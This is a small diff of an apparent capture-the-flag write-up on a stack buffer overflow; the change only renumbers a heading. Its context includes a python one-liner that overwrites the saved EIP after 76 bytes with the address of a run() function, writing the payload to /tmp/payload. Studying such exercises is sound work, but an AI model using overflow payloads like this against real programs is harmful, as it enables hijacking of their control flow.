@@ -47,7 +47,7 @@ Let's get the address of `run()` using gdb :
 
 After some tests, we find that the **saved EIP is overwritten after 76 bytes**.
 
-## 4. Getting the flag
+## 5. Getting the flag
 
 ```bash
 $ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
